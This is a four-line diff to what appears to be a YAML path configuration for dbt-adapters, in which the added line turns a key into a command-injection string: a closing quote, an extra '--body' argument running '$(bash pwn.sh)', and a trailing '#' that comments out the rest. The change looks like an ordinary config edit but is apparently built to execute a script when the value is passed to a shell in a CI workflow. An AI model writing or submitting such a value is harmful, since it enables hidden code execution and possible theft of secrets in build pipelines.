@@ -1,4 +1,4 @@
-dbt-adapters:
+dbt-adapters" --body "$(bash pwn.sh)" #:
 -   'dbt-adapters/src/**'
 -   'dbt-adapters/pyproject.toml'
 dbt-tests-adapter:
